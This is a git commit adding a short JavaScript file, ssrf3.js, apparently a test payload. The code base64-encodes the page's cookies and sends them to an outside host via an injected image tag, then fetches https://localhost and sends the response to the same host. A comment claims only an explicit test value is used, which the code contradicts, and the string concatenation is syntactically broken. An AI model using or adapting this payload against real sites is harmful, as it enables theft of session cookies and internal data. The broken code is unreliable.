8a3e8f881b5efb30384f43fa2e9f72b40ad40302
Gerjan <gerjan@cybercloud.cc>
2026-09-17 15:50:07 +0200

    Create ssrf3.js
    test3

---
+++ ssrf3.js
@@ -0,0 +1,13 @@
+data = btoa(document.cookie)
+document.write('<img src="https://1nj.nl/?c=' + data'></img");
+
+async function test() {
+  const response = await fetch('https://localhost');
+  const data = await response.text();
+
+  // Test alleen met een expliciete testwaarde
+  const encoded = encodeURIComponent(btoa(data));
+  document.write('<img src="https://1nj.nl/?d=' + encoded'></img");
+}
+
+test();
